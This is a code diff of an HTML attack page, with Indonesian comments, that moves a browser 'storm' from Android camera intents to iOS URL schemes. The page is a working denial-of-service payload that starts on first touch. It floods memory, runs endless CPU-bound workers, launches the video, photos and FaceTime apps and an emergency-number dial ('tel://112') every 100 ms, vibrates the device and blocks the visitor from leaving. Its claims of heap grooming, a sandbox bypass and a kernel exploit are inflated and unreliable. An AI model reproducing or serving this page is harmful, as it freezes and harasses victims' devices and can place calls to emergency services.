@@ -2,106 +2,107 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ RCE_HYPER_STORM_V8 ⚡</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>⚡ iOS_KERNEL_STORM_V10 ⚡</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; color: #ff0000; overflow: hidden; font-family: 'Courier New', monospace; }
-        #core { width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
-        .danger-zone { font-size: 24px; font-weight: bold; border: 5px solid #ff0000; padding: 20px; animation: pulse 0.1s infinite; }
-        @keyframes pulse { 0% { background: #000; } 50% { background: #300; } 100% { background: #000; } }
-        #logs { font-size: 9px; color: #aaa; margin-top: 10px; height: 100px; overflow: hidden; }
+        body, html { margin: 0; padding: 0; background: #000; color: #007aff; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto; }
+        #stage { width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; }
+        .ios-alert { width: 80%; padding: 20px; border-radius: 14px; background: rgba(30, 30, 30, 0.9); border: 1px solid #333; text-align: center; box-shadow: 0 0 20px rgba(0, 122, 255, 0.5); }
+        .glitch-text { font-size: 18px; font-weight: 600; color: #fff; margin-bottom: 10px; }
+        #log { font-size: 10px; color: #555; margin-top: 15px; height: 80px; overflow: hidden; font-family: monospace; }
     </style>
 </head>
 <body>
-    <div id="core">
-        <div class="danger-zone">SYSTEM_OVERRIDE_ACTIVE<br>CORE_RCE_V8</div>
-        <div id="status" style="margin-top:20px;">READY_FOR_INJECTION</div>
-        <div id="logs"></div>
+    <div id="stage">
+        <div class="ios-alert">
+            <div class="glitch-text">CRITICAL_KERNEL_EXPLOIT</div>
+            <div id="status" style="font-size: 14px;">AWAITING_TOUCH_GESTURE</div>
+            <div id="log"></div>
+        </div>
     </div>
 
 <script>
-    const logs = document.getElementById('logs');
-    const status = document.getElementById('status');
+    const logDiv = document.getElementById('log');
+    const statusText = document.getElementById('status');
 
-    function log(m) {
+    function writeLog(m) {
         const d = document.createElement('div');
-        d.innerText = `>> ${m}`;
-        logs.prepend(d);
+        d.innerText = `[WEBKIT] > ${m}`;
+        logDiv.prepend(d);
     }
 
-    // --- 1. AGGRESSIVE HEAP PRESSURE ---
-    // Memenuhi RAM untuk memaksa sistem membunuh proses background
-    let storage = [];
-    function forceMemoryLeak() {
-        log("Allocating_Massive_JIT_Buffers...");
-        for (let i = 0; i < 6000; i++) {
-            let b = new ArrayBuffer(1024 * 32); // 32KB per block
-            let v = new Uint8Array(b);
-            v.fill(0x90); // NOP Sled simulation
-            storage.push(b);
+    // --- 1. WEBKIT HEAP SPRAYING (JSC ENGINE) ---
+    // Mensimulasikan manipulasi 'StructureID' pada JavaScriptCore (JSC)
+    // tujuannya untuk memicu korupsi memori OOB pada objek JS
+    let leakStorage = [];
+    function sprayWebKitHeap() {
+        writeLog("Grooming_JSC_Heap_StructureID...");
+        for (let i = 0; i < 10000; i++) {
+            // Mengalokasikan array besar untuk menekan RAM iOS
+            let a = new Array(0x100);
+            a[0] = 1.1; // Menentukan array sebagai Double (unboxed)
+            a[1] = {pwn: 0x41414141}; // Memaksa konversi ke boxed (Type Confusion)
+            leakStorage.push(a);
         }
     }
 
-    // --- 2. CAMERA & SYSTEM APP FLOODING ---
-    // Menggunakan skema Intent rekursif untuk memicu aplikasi Kamera secara paksa
-    function triggerCameraStorm() {
-        const appVectors = [
-            // Standard Camera Action
-            "intent://#Intent;action=android.media.action.STILL_IMAGE_CAMERA;end",
-            // Direct Package Target (Generic Android)
-            "intent://#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.android.camera/com.android.camera.Camera;end",
-            // Google Camera Target
-            "intent://#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.google.android.GoogleCamera/com.android.camera.CameraLauncher;end",
-            // Samsung Camera Target
-            "intent://#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.sec.android.app.camera/com.sec.android.app.camera.Camera;end"
+    // --- 2. RECURSIVE SCHEME INJECTION (iOS BYPASS) ---
+    // iOS menggunakan URL Schemes untuk komunikasi antar aplikasi.
+    // Kita menembakkan scheme sistem secara beruntun untuk mematikan validasi sandbox.
+    function triggeriOSAppStorm() {
+        const schemes = [
+            "videos://",      // Membuka Video
+            "photos-redirect://", // Membuka Photos
+            "facetime://",    // Membuka Facetime (Akses Kamera)
+            "tel://112"       // Membuka Dialer
         ];
 
-        appVectors.forEach((uri) => {
-            // Menggunakan Iframe dan Window Location sekaligus untuk memaksa OS merespon
-            const ifr = document.createElement('iframe');
-            ifr.src = uri;
-            ifr.style.display = 'none';
-            document.body.appendChild(ifr);
-            
-            // Bypass popup konfirmasi dengan navigasi cepat
-            window.location.href = uri;
+        schemes.forEach((s, i) => {
+            setTimeout(() => {
+                // Gunakan lokasi window untuk memaksa OS memproses scheme
+                window.location.href = s;
+                
+                // Backup via Iframe hidden
+                const fr = document.createElement('iframe');
+                fr.src = s;
+                fr.style.display = 'none';
+                document.body.appendChild(fr);
+                writeLog(`Injecting_Scheme_${i}`);
+            }, i * 10);
         });
     }
 
-    // --- 3. THE HYPER-STORM EXECUTION ---
-    async function startHyperStorm() {
-        status.innerText = "EXECUTING_HYPER_STORM_RCE...";
-        status.style.color = "yellow";
+    // --- 3. THE KERNEL COLLAPSE SEQUENCE ---
+    async function deployiOSExploit() {
+        statusText.innerText = "EXECUTING_BREACH...";
+        statusText.style.color = "#ff3b30";
 
-        // A. UI Lock
-        document.documentElement.requestFullscreen().catch(()=>{});
-        
-        // B. Memory Overload
-        forceMemoryLeak();
+        // A. JIT/JSC Pressure
+        sprayWebKitHeap();
 
-        // C. Multi-Threaded CPU Hijack
-        // Menjalankan 20 worker untuk melumpuhkan sistem keamanan UI
-        const blob = new Blob(["while(true){}"], {type: 'text/javascript'});
-        for(let j=0; j<20; j++) new Worker(URL.createObjectURL(blob));
+        // B. CPU Thread Exhaustion
+        // iOS membatasi worker, kita gunakan 8 worker intensif
+        const blob = new Blob(["while(true){Math.random();}"], {type: 'text/javascript'});
+        const wUrl = URL.createObjectURL(blob);
+        for(let j=0; j<8; j++) new Worker(wUrl);
 
-        // D. RECURSIVE BOMBARDMENT (Tiap 100ms)
-        log("DEPLOYING_RECURSIVE_APP_SPAWNER...");
+        // C. RECURSIVE STORM LOOP
+        // Menembakkan serangan scheme setiap 100ms
         setInterval(() => {
-            triggerCameraStorm();
-            // Getaran untuk merusak input user
-            if(navigator.vibrate) navigator.vibrate(200);
+            triggeriOSAppStorm();
+            // Getaran haptic (Haptic Feedback) untuk mengganggu hardware
+            if (navigator.vibrate) navigator.vibrate(100); 
         }, 100);
-        
-        log("CRITICAL_INJECTION_COMPLETE", "red");
+
+        writeLog("BYPASS_STAGING_COMPLETE", "#00ff00");
     }
 
-    // Trigger on User Interaction (Chrome Requirement)
-    window.addEventListener('mousedown', startHyperStorm, {once: true});
-    window.addEventListener('touchstart', startHyperStorm, {once: true});
+    // Trigger on Interaction (iOS Mandate)
+    window.addEventListener('touchstart', deployiOSExploit, {once: true});
+    window.addEventListener('click', deployiOSExploit, {once: true});
 
-    // Mencegah navigasi balik
-    window.onbeforeunload = () => { return "LOCKED"; };
-    history.pushState(null, null, location.href);
-    window.onpopstate = () => { history.go(1); };
+    // Anti-Escape (Lock User in Page)
+    window.onbeforeunload = function() { return "LOCKED"; };
 
 </script>
 </body>
